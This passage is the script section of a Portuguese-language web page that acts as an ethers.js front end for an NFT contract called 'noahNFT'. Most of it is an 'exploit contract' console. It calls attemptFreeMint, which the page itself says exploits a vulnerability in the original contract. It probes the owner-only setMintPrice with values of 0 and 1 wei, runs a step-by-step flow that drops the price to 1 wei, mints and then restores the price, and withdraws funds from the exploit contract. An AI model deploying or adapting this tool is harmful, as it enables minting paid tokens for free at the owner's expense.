                // Verificar saldo de USDT
                const usdtBalanceWei = await usdtContract.balanceOf(userAddress);
                const usdtBalanceEth = ethers.utils.formatUnits(usdtBalanceWei, 18);
                
                if (parseFloat(usdtBalanceEth) < 30) {
                    showAlert('Saldo de USDT insuficiente. Você precisa de pelo menos 30 USDT.', 'danger');
                    showLoading(false);
                    return;
                }
                
                // Verificar aprovação
                const allowanceWei = await usdtContract.allowance(userAddress, ORIGINAL_CONTRACT_ADDRESS);
                const allowanceEth = ethers.utils.formatUnits(allowanceWei, 18);
                
                if (parseFloat(allowanceEth) < 30) {
                    showAlert('Aprovando o contrato para usar 30 USDT...', 'info');
                    
                    const approveTx = await usdtContract.approve(ORIGINAL_CONTRACT_ADDRESS, ethers.utils.parseUnits('30', 18));
                    await approveTx.wait();
                    
                    showAlert('Aprovação concluída. Agora mintando o NFT...', 'success');
                }
                
                // Mint NFT
                const mintTx = await originalContract.mint();
                showTransactionInfo(mintTx.hash);
                
                await mintTx.wait();
                
                showAlert('NFT mintado com sucesso!', 'success');
                await updateBalances();
                await updateNFTs();
            } catch (error) {
                console.error('Erro ao mintar NFT:', error);
                showAlert(`Erro ao mintar NFT: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function setExploitContract() {
            const address = exploitContractInput.value.trim();
            
            if (!address) {
                showAlert('Por favor, insira um endereço de contrato válido.', 'danger');
                return;
            }
            
            if (!ethers.utils.isAddress(address)) {
                showAlert('Endereço de contrato inválido.', 'danger');
                return;
            }
            
            try {
                exploitContractAddress = address;
                exploitContract = new ethers.Contract(exploitContractAddress, EXPLOIT_CONTRACT_V2_ABI, signer);
                
                // Verificar se o contrato é válido
                const noahNFTAddress = await exploitContract.noahNFT();
                
                if (noahNFTAddress.toLowerCase() !== ORIGINAL_CONTRACT_ADDRESS.toLowerCase()) {
                    showAlert('O contrato de exploração não está configurado para o contrato noahNFT correto.', 'danger');
                    return;
                }
                
                // Atualizar UI
                document.getElementById('exploitContract').textContent = exploitContractAddress;
                exploitContractAddressSpan.textContent = exploitContractAddress;
                freeMintBtn.disabled = false;
                checkPermissionsBtn.disabled = false;
                withdrawBtn.disabled = false;
                testSetPriceBtn.disabled = false;
                testSetPriceLowBtn.disabled = false;
                testMintBtn.disabled = false;
                checkContractStateBtn.disabled = false;
                listenEventsBtn.disabled = false;
                step1Btn.disabled = false;
                exploitStatus.style.display = 'block';
                
                showAlert('Contrato de exploração V2 configurado com sucesso!', 'success');
                await updateBalances();
            } catch (error) {
                console.error('Erro ao configurar contrato de exploração:', error);
                showAlert(`Erro ao configurar contrato de exploração: ${error.message}`, 'danger');
            }
        }
        
        async function checkPermissions() {
            showLoading(true);
            
            try {
                const canChange = await exploitContract.canChangePrice();
                
                if (canChange) {
                    permissionsResult.textContent = 'Você tem permissão para alterar o preço do mint.';
                    permissionsResult.className = 'text-success';
                    showAlert('Você tem permissão para alterar o preço do mint!', 'success');
                } else {
                    permissionsResult.textContent = 'Você não tem permissão para alterar o preço do mint.';
                    permissionsResult.className = 'text-danger';
                    showAlert('Você não tem permissão para alterar o preço do mint.', 'warning');
                }
            } catch (error) {
                console.error('Erro ao verificar permissões:', error);
                showAlert(`Erro ao verificar permissões: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function freeMint() {
            if (!confirm('Tem certeza que deseja usar o método de mint gratuito? Este método explora uma vulnerabilidade no contrato original.')) {
                return;
            }
            
            showLoading(true);
            
            try {
                // Obter opções de gás
                const gasLimit = parseInt(gasLimitInput.value) || 3000000;
                const gasPrice = ethers.utils.parseUnits(gasPriceInput.value.toString() || '25', 'gwei');
                
                // Configurar opções de transação
                const options = {
                    gasLimit: gasLimit,
                    gasPrice: gasPrice
                };
                
                // Se pular estimativa de gás, adicionar a opção
                if (skipGasEstimation.checked) {
                    options.gasLimit = ethers.BigNumber.from(gasLimit);
                }
                
                // Tentar mint gratuito através do contrato de exploração V2
                const result = await exploitContract.attemptFreeMint(options);
                showTransactionInfo(result.hash);
                
                await result.wait();
                
                if (result) {
                    showAlert('NFT mintado gratuitamente com sucesso!', 'success');
                } else {
                    showAlert('Não foi possível mintar o NFT gratuitamente. Tente o diagnóstico.', 'warning');
                }
                
                await updateBalances();
                await updateNFTs();
            } catch (error) {
                console.error('Erro ao mintar NFT gratuitamente:', error);
                
                // Exibir detalhes do erro
                let errorMessage = `Erro ao mintar NFT gratuitamente: ${error.message}`;
                
                if (error.error && error.error.data) {
                    errorMessage += `<div class="error-details mt-2">
                        <strong>Detalhes do erro:</strong><br>
                        ${JSON.stringify(error.error.data, null, 2)}
                    </div>`;
                }
                
                if (error.transaction) {
                    errorMessage += `<div class="error-details mt-2">
                        <strong>Detalhes da transação:</strong><br>
                        ${JSON.stringify(error.transaction, null, 2)}
                    </div>`;
                }
                
                showAlert(errorMessage, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function runDiagnostic() {
            showLoading(true);
            diagnosticResultsDiv.style.display = 'block';
            
            // Resetar resultados
            diagnosticResults = {};
            resetDiagnosticResults();
            
            try {
                // 1. Verificar Proprietário do Contrato
                updateDiagnosticResult(1, 'executing', 'Executando...');
                try {
                    const owner = await originalContract.owner();
                    diagnosticResults.isOwner = owner.toLowerCase() === userAddress.toLowerCase();
                    updateDiagnosticResult(1, diagnosticResults.isOwner ? 'success' : 'error', 
                        `Proprietário: ${owner}. Você ${diagnosticResults.isOwner ? 'é' : 'não é'} o proprietário.`);
                } catch (error) {
                    updateDiagnosticResult(1, 'error', `Erro: ${error.message}`);
                }
                
                // 2. Testar setMintPrice(0)
                updateDiagnosticResult(2, 'executing', 'Executando...');
                try {
                    const tx = await originalContract.setMintPrice(0, {
                        gasLimit: 2000000,
                        gasPrice: ethers.utils.parseUnits('25', 'gwei')
                    });
                    await tx.wait();
                    updateDiagnosticResult(2, 'success', 'setMintPrice(0) executado com sucesso!');
                    diagnosticResults.setPrice0Success = true;
                } catch (error) {
                    updateDiagnosticResult(2, 'error', `Falha: ${error.message}`);
                    diagnosticResults.setPrice0Success = false;
                }
                
                // 3. Testar setMintPrice(1)
                updateDiagnosticResult(3, 'executing', 'Executando...');
                try {
                    const tx = await originalContract.setMintPrice(1, {
                        gasLimit: 2000000,
                        gasPrice: ethers.utils.parseUnits('25', 'gwei')
                    });
                    await tx.wait();
                    updateDiagnosticResult(3, 'success', 'setMintPrice(1) executado com sucesso!');
                    diagnosticResults.setPrice1Success = true;
                } catch (error) {
                    updateDiagnosticResult(3, 'error', `Falha: ${error.message}`);
                    diagnosticResults.setPrice1Success = false;
                }
                
                // 4. Testar mint() direto
                updateDiagnosticResult(4, 'executing', 'Executando...');
                try {
                    const tx = await originalContract.mint({
                        gasLimit: 3000000,
                        gasPrice: ethers.utils.parseUnits('25', 'gwei')
                    });
                    await tx.wait();
                    updateDiagnosticResult(4, 'success', 'mint() executado com sucesso!');
                    diagnosticResults.mintSuccess = true;
                } catch (error) {
                    updateDiagnosticResult(4, 'error', `Falha: ${error.message}`);
                    diagnosticResults.mintSuccess = false;
                }
                
                // 5. Verificar Saldo e Allowance
                updateDiagnosticResult(5, 'executing', 'Executando...');
                try {
                    const usdtBalance = await usdtContract.balanceOf(userAddress);
                    const allowance = await usdtContract.allowance(userAddress, ORIGINAL_CONTRACT_ADDRESS);
                    
                    diagnosticResults.usdtBalance = parseFloat(ethers.utils.formatUnits(usdtBalance, 18));
                    diagnosticResults.usdtAllowance = parseFloat(ethers.utils.formatUnits(allowance, 18));
                    
                    updateDiagnosticResult(5, 'success', 
                        `Saldo USDT: ${diagnosticResults.usdtBalance.toFixed(2)}, Allowance: ${diagnosticResults.usdtAllowance.toFixed(2)}`);
                } catch (error) {
                    updateDiagnosticResult(5, 'error', `Erro: ${error.message}`);
                }
                
                // 6. Tentar Mint com Contrato V2
                updateDiagnosticResult(6, 'executing', 'Executando...');
                try {
                    if (exploitContract) {
                        const result = await exploitContract.attemptFreeMint({
                            gasLimit: 5000000,
                            gasPrice: ethers.utils.parseUnits('30', 'gwei')
                        });
                        await result.wait();
                        updateDiagnosticResult(6, 'success', 'Mint com contrato V2 executado com sucesso!');
                        diagnosticResults.v2Success = true;
                    } else {
                        updateDiagnosticResult(6, 'error', 'Contrato V2 não configurado');
                    }
                } catch (error) {
                    updateDiagnosticResult(6, 'error', `Falha: ${error.message}`);
                    diagnosticResults.v2Success = false;
                }
                
                // Gerar recomendações
                generateRecommendations();
                
                showAlert('Diagnóstico concluído!', 'success');
            } catch (error) {
                console.error('Erro ao executar diagnóstico:', error);
                showAlert(`Erro ao executar diagnóstico: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        function updateDiagnosticResult(step, status, message) {
            const element = document.getElementById(`diagnostic${step}`);
            const valueElement = element.querySelector('.diagnostic-value');
            
            element.className = `result-item result-${status}`;
            valueElement.textContent = message;
        }
        
        function resetDiagnosticResults() {
            for (let i = 1; i <= 6; i++) {
                updateDiagnosticResult(i, 'pending', 'Executando...');
            }
        }
        
        function generateRecommendations() {
            let recommendationsText = '';
            
            if (!diagnosticResults.isOwner) {
                recommendationsText += '• Você não é o proprietário do contrato. Isso pode impedir a alteração do preço do mint.\n';
            }
            
            if (!diagnosticResults.setPrice0Success && !diagnosticResults.setPrice1Success) {
                recommendationsText += '• Não foi possível alterar o preço do mint. O contrato pode ter proteções contra alterações de preço.\n';
            } else if (diagnosticResults.setPrice1Success) {
                recommendationsText += '• Foi possível alterar o preço para 1 wei, mas não para 0. Tente usar 1 wei em vez de 0.\n';
            }
            
            if (!diagnosticResults.mintSuccess) {
                recommendationsText += '• Não foi possível executar o mint diretamente. Verifique se você tem saldo suficiente de USDT.\n';
            }
            
            if (diagnosticResults.usdtBalance < 30 && !diagnosticResults.mintSuccess) {
                recommendationsText += '• Seu saldo de USDT é inferior a 30. Isso pode estar impedindo o mint.\n';
            }
            
            if (diagnosticResults.v2Success) {
                recommendationsText += '• O mint com o contrato V2 funcionou! Use o método "Tentar Mint Gratuito" na aba "Contrato de Exploração".\n';
            } else {
                recommendationsText += '• Nenhuma das abordagens funcionou. O contrato original pode ter proteções robustas contra exploração.\n';
            }
            
            recommendations.textContent = recommendationsText;
        }
        
        async function step1CheckPermissions() {
            showLoading(true);
            updateStepStatus(1, 'pending');
            
            try {
                const canChange = await exploitContract.canChangePrice();
                
                if (canChange) {
                    updateStepStatus(1, 'success');
                    showAlert('Você tem permissão para alterar o preço do mint!', 'success');
                    step2Btn.disabled = false;
                } else {
                    updateStepStatus(1, 'error');
                    showAlert('Você não tem permissão para alterar o preço do mint.', 'warning');
                }
            } catch (error) {
                console.error('Erro ao verificar permissões:', error);
                updateStepStatus(1, 'error');
                showAlert(`Erro ao verificar permissões: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function step2SetPrice() {
            if (!confirm('Tem certeza que deseja alterar o preço do mint para 1 wei?')) {
                return;
            }
            
            showLoading(true);
            updateStepStatus(2, 'pending');
            
            try {
                // Alterar preço para 1 wei
                const tx = await originalContract.setMintPrice(1, {
                    gasLimit: 2000000,
                    gasPrice: ethers.utils.parseUnits('25', 'gwei')
                });
                
                showTransactionInfo(tx.hash);
                await tx.wait();
                
                updateStepStatus(2, 'success');
                showAlert('Preço alterado para 1 wei com sucesso!', 'success');
                
                // Habilitar próximo passo
                step3Btn.disabled = false;
            } catch (error) {
                console.error('Erro ao alterar preço para 1 wei:', error);
                updateStepStatus(2, 'error');
                showAlert(`Erro ao alterar preço para 1 wei: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function step3Mint() {
            if (!confirm('Tem certeza que deseja mintar o NFT?')) {
                return;
            }
            
            showLoading(true);
            updateStepStatus(3, 'pending');
            
            try {
                // Mint NFT
                const tx = await originalContract.mint({
                    gasLimit: 3000000,
                    gasPrice: ethers.utils.parseUnits('25', 'gwei')
                });
                
                showTransactionInfo(tx.hash);
                await tx.wait();
                
                updateStepStatus(3, 'success');
                showAlert('NFT mintado com sucesso!', 'success');
                
                // Atualizar saldos
                await updateBalances();
                await updateNFTs();
                
                // Habilitar próximo passo
                step4Btn.disabled = false;
            } catch (error) {
                console.error('Erro ao mintar NFT:', error);
                updateStepStatus(3, 'error');
                showAlert(`Erro ao mintar NFT: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function step4RestorePrice() {
            if (!confirm('Tem certeza que deseja restaurar o preço original?')) {
                return;
            }
            
            showLoading(true);
            updateStepStatus(4, 'pending');
            
            try {
                // Restaurar preço original
                const tx = await originalContract.setMintPrice(ethers.utils.parseUnits('30', 18), {
                    gasLimit: 2000000,
                    gasPrice: ethers.utils.parseUnits('25', 'gwei')
                });
                
                showTransactionInfo(tx.hash);
                await tx.wait();
                
                updateStepStatus(4, 'success');
                showAlert('Preço original restaurado com sucesso!', 'success');
                
                // Resetar passos
                setTimeout(() => {
                    updateStepStatus(1, 'pending');
                    updateStepStatus(2, 'pending');
                    updateStepStatus(3, 'pending');
                    updateStepStatus(4, 'pending');
                    step2Btn.disabled = true;
                    step3Btn.disabled = true;
                    step4Btn.disabled = true;
                }, 3000);
            } catch (error) {
                console.error('Erro ao restaurar preço original:', error);
                updateStepStatus(4, 'error');
                showAlert(`Erro ao restaurar preço original: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        function updateStepStatus(step, status) {
            const statusElement = document.getElementById(`step${step}Status`);
            statusElement.className = `step-status ${status}`;
            
            switch(status) {
                case 'pending':
                    statusElement.textContent = 'Pendente';
                    break;
                case 'success':
                    statusElement.textContent = 'Concluído';
                    break;
                case 'error':
                    statusElement.textContent = 'Falhou';
                    break;
            }
        }
        
        async function testSetPrice(price) {
            if (!confirm(`Tem certeza que deseja testar a função setMintPrice(${price})?`)) {
                return;
            }
            
            showLoading(true);
            
            try {
                // Testar setMintPrice
                const tx = await originalContract.setMintPrice(price, {
                    gasLimit: 2000000,
                    gasPrice: ethers.utils.parseUnits('25', 'gwei')
                });
                
                showTransactionInfo(tx.hash);
                await tx.wait();
                
                showAlert(`setMintPrice(${price}) executado com sucesso!`, 'success');
                
                // Adicionar informação de debug
                addDebugInfo(`setMintPrice(${price}) executado com sucesso`);
            } catch (error) {
                console.error(`Erro ao testar setMintPrice(${price}):`, error);
                showAlert(`Erro ao testar setMintPrice(${price}): ${error.message}`, 'danger');
                
                // Adicionar informação de debug
                addDebugInfo(`Erro ao testar setMintPrice(${price}): ${error.message}`);
            } finally {
                showLoading(false);
            }
        }
        
        async function testMint() {
            if (!confirm('Tem certeza que deseja testar a função mint()?')) {
                return;
            }
            
            showLoading(true);
            
            try {
                // Testar mint()
                const tx = await originalContract.mint({
                    gasLimit: 3000000,
                    gasPrice: ethers.utils.parseUnits('25', 'gwei')
                });
                
                showTransactionInfo(tx.hash);
                await tx.wait();
                
                showAlert('mint() executado com sucesso!', 'success');
                
                // Adicionar informação de debug
                addDebugInfo('mint() executado com sucesso');
                
                // Atualizar saldos
                await updateBalances();
                await updateNFTs();
            } catch (error) {
                console.error('Erro ao testar mint():', error);
                showAlert(`Erro ao testar mint(): ${error.message}`, 'danger');
                
                // Adicionar informação de debug
                addDebugInfo(`Erro ao testar mint(): ${error.message}`);
            } finally {
                showLoading(false);
            }
        }
        
        async function checkContractState() {
            showLoading(true);
            
            try {
                // Verificar estado do contrato
                const owner = await originalContract.owner();
                const totalSupply = await originalContract.totalSupply();
                const userBalance = await originalContract.balanceOf(userAddress);
                
                const stateInfo = {
                    owner: owner,
                    totalSupply: totalSupply.toString(),
                    userBalance: userBalance.toString(),
                    userAddress: userAddress,
                    exploitContractAddress: exploitContractAddress,
                    timestamp: new Date().toISOString()
                };
                
                // Exibir informações de debug
                addDebugInfo('Estado do Contrato:', JSON.stringify(stateInfo, null, 2));
                
                showAlert('Estado do contrato verificado com sucesso!', 'success');
            } catch (error) {
                console.error('Erro ao verificar estado do contrato:', error);
                showAlert(`Erro ao verificar estado do contrato: ${error.message}`, 'danger');
                
                // Adicionar informação de debug
                addDebugInfo(`Erro ao verificar estado do contrato: ${error.message}`);
            } finally {
                showLoading(false);
            }
        }
        
        function addDebugInfo(title, content = '') {
            debugInfo.style.display = 'block';
            
            if (content) {
                debugContent.textContent += `\n[${new Date().toLocaleTimeString()}] ${title}:\n${content}\n\n`;
            } else {
                debugContent.textContent += `\n[${new Date().toLocaleTimeString()}] ${title}\n\n`;
            }
            
            // Rolar para o final
            debugContent.scrollTop = debugContent.scrollHeight;
        }
        
        function toggleEventListening() {
            if (listenEventsBtn.textContent.includes('Iniciar')) {
                startEventListening();
                listenEventsBtn.textContent = 'Parar Monitoramento de Eventos';
                listenEventsBtn.classList.remove('btn-success');
                listenEventsBtn.classList.add('btn-danger');
            } else {
                stopEventListening();
                listenEventsBtn.textContent = 'Iniciar Monitoramento de Eventos';
                listenEventsBtn.classList.remove('btn-danger');
                listenEventsBtn.classList.add('btn-success');
            }
        }
        
        function startEventListening() {
            eventsList.style.display = 'block';
            
            // Limpar eventos anteriores
            eventsContent.innerHTML = '';
            
            // Ouvir eventos FreeMintAttempt
            const freeMintListener = exploitContract.on('FreeMintAttempt', (user, success) => {
                addEventInfo('FreeMintAttempt', `user: ${user}, success: ${success}`);
            });
            
            // Ouvir eventos SetPriceAttempt
            const setPriceListener = exploitContract.on('SetPriceAttempt', (newPrice, success) => {
                addEventInfo('SetPriceAttempt', `newPrice: ${newPrice.toString()}, success: ${success}`);
            });
            
            // Armazenar listeners para poder removê-los depois
            eventListeners = [freeMintListener, setPriceListener];
            
            showAlert('Monitoramento de eventos iniciado!', 'success');
        }
        
        function stopEventListening() {
            // Remover todos os listeners
            eventListeners.forEach(listener => {
                listener.removeAllListeners();
            });
            
            eventListeners = [];
            
            showAlert('Monitoramento de eventos parado!', 'info');
        }
        
        function addEventInfo(eventName, details) {
            const eventDiv = document.createElement('div');
            eventDiv.className = 'mb-2 p-2 bg-dark rounded';
            eventDiv.innerHTML = `
                <strong>${eventName}</strong> - ${new Date().toLocaleTimeString()}<br>
                <small>${details}</small>
            `;
            
            eventsContent.insertBefore(eventDiv, eventsContent.firstChild);
            
            // Limitar número de eventos exibidos
            if (eventsContent.children.length > 10) {
                eventsContent.removeChild(eventsContent.lastChild);
            }
        }
        
        async function claimRewards() {
            if (!confirm('Tem certeza que deseja resgatar suas recompensas? Uma taxa de 5% será deduzida.')) {
                return;
            }
            
            showLoading(true);
            
            try {
                const claimTx = await originalContract.claim();
                showTransactionInfo(claimTx.hash);
                
                await claimTx.wait();
                
                showAlert('Recompensas resgatadas com sucesso!', 'success');
                await updateBalances();
                await updateRewards();
            } catch (error) {
                console.error('Erro ao resgatar recompensas:', error);
                showAlert(`Erro ao resgatar recompensas: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function withdrawFunds() {
            if (!confirm('Tem certeza que deseja sacar os fundos do contrato de exploração?')) {
                return;
            }
            
            showLoading(true);
            
            try {
                const withdrawTx = await exploitContract.withdraw();
                showTransactionInfo(withdrawTx.hash);
                
                await withdrawTx.wait();
                
                showAlert('Fundos sacados com sucesso!', 'success');
                await updateBalances();
            } catch (error) {
                console.error('Erro ao sacar fundos:', error);
                showAlert(`Erro ao sacar fundos: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        function showLoading(show) {
            if (show) {
                loadingIndicator.classList.add('show');
            } else {
                loadingIndicator.classList.remove('show');
            }
        }
        
        function showTransactionInfo(hash) {
            txHash.textContent = hash;
            txStatus.textContent = 'Pendente';
            transactionInfo.classList.add('show');
            
            // Verificar status da transação
            provider.once(hash, (receipt) => {
                if (receipt.status === 1) {
                    txStatus.textContent = 'Concluída com sucesso';
                } else {
                    txStatus.textContent = 'Falhou';
                }
            });
        }
        
        function showAlert(message, type) {
            const alertDiv = document.createElement('div');
            alertDiv.className = `alert alert-${type} alert-dismissible fade show alert-custom`;
            alertDiv.innerHTML = `
                ${message}
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            `;
            
            alertContainer.appendChild(alertDiv);
            
            // Auto-fechar após 5 segundos
            setTimeout(() => {
                alertDiv.classList.remove('show');
                setTimeout(() => {
                    alertDiv.remove();
                }, 300);
            }, 5000);
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text)
                .then(() => {
                    showAlert('Copiado para a área de transferência!', 'success');
                })
                .catch(err => {
                    console.error('Erro ao copiar texto: ', err);
                    showAlert('Erro ao copiar texto.', 'danger');
                });
        }
        
        // Monitorar mudanças de conta
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    // Usuário desconectou a carteira
                    disconnectWallet();
                } else {
                    // Usuário mudou de conta
                    userAddress = accounts[0];
                    updateWalletUI();
                    updateBalances();
                    updateNFTs();
                    updateRewards();
                }
            });
            
            window.ethereum.on('chainChanged', () => {
                // Recarregar a página quando a rede mudar
                window.location.reload();
            });
        }
    </script>
</body>
</html>
